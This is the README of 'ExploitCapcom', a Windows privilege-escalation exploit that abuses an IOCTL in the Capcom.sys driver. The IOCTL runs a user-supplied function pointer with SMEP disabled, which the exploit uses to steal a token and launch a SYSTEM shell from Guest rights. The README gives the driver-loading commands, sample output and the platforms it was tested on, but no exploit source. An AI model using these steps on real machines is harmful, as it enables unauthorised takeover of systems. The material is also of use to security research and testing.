ExploitCapcom
==============

Description
------------

This is a standalone exploit for a vulnerable feature in Capcom.sys. The feature is exposed through IOCTL and to execute an arbitrary user supplied function pointer with disabling SMEP. This exploit simply abuses the feature to perform token stealing to get the SYSTEM privileges, and then launches the command prompt with the elevated privilege.

For more details, see:
- https://github.com/rapid7/metasploit-framework/pull/7363


Usage
------

Load the Capcom.sys first, then execute this exploit.

    >sc create Capcom type= kernel binPath= C:\Users\user\Desktop\Capcom.sys
    >sc start Capcom

    >ExploitCapcom.exe
    [*] Capcom.sys exploit
    [*] Capcom.sys handle was obtained as 0000000000000070
    [*] Shellcode was placed at 00000288427B0008
    [+] Shellcode was executed
    [+] Token stealing was successful
    [+] The SYSTEM shell was launched
    [*] Press any key to exit this program

You will see a new console running with the SYSTEM privileges.

![win10_demo](/img/win10_demo.png)

Tested Platforms
-----------------
- Capcom.sys (SHA1: c1d5cf8c43e7679b782630e93f5e6420ca1749a7)
- Windows 7 (x64) SP1 with the Guest privileges
- Windows 10 (x64) Build 14393 with the Guest privileges

License
--------
This software is released under the MIT License, see LICENSE.
